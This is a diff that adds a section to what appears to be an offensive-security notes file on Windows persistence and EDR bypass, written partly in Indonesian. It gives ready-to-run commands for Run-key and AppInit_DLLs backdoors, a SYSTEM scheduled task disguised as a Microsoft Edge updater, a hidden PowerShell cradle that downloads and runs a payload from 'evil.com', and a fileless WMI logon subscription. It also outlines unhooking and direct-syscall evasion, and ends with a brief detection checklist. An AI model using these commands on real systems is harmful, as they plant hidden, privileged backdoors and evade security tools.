@@ -94,3 +94,77 @@ Result: User context → beacon → C2 → escalation
 - MITRE T1543 — https://attack.mitre.org/techniques/T1543/
 - Persistence Research — https://www.ired.team/offensive-security/persistence
 - EDR Evasion — https://www.mdsec.co.uk/research/
+
+## Konkret — Desktop Persist & Bypass (Testable)
+
+### Registry Persistence
+
+```powershell
+# Run key (most common / blue team tahu)
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
+
+# Less-known: AppInit_DLLs (inject ke semua process)
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
+```
+
+### Scheduled Task (stealth persistence)
+
+```powershell
+# Trigger saat user logon, tidak terlihat di Task Scheduler UI bila diatur ini:
+schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "powershell.exe -WindowStyle Hidden -Command C:\backdoor.exe" /sc onlogon /ru SYSTEM
+
+# PowerShell one-liner (bypass execution policy)
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+```
+
+### WMI Event Subscription (fileless)
+
+```powershell
+# Filter: trigger saat logon
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = "LogonFilter"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
+}
+
+# Consumer: jalankan command
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = "LogonConsumer"
+    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(...)"
+}
+
+# Binding
+Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
+# Detection: Sysmon EID 19/20/21 (WMI filter/consumer/binding)
+```
+
+### EDR Bypass (Direct Syscalls + unhooking)
+
+```c
+// 1. Dapatkan syscalls stub secara manual (tidak lewat ntdll.dll)
+//    resolve dari ntdll.dll, extract syscall number, call direct di assembly
+
+// 2. Unhooking: replace hooked ntdll.dll di memori dengan clean copy
+//    read C:\Windows\System32\ntdll.dll dari disk → overwrite memory section
+
+// 3. Sleep obfuscation: encrypt shellcode selama inaktif
+//    Decrypt hanya saat eksekusi (memori thread)
+//    Hasil: memory scan tidak menemukan shellcode saat idle
+
+// SysWhispers3 (C)
+#include "syscalls.h"
+// Direct syscalls NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.
+```
+
+### Def check
+
+1. Run key, AppInit_DLLs, Scheduled Task, WMI subscription — audit all
+2. Sysmon EID 19/20/21 — WMI events
+3. Sysmon EID 11 — file create (backdoor exe)
+4. ETW Threat Intelligence — callback detection
+5. AMSI bypass (-ExecutionPolicy bypass tidak cukup)
+---
+
+audited
+---
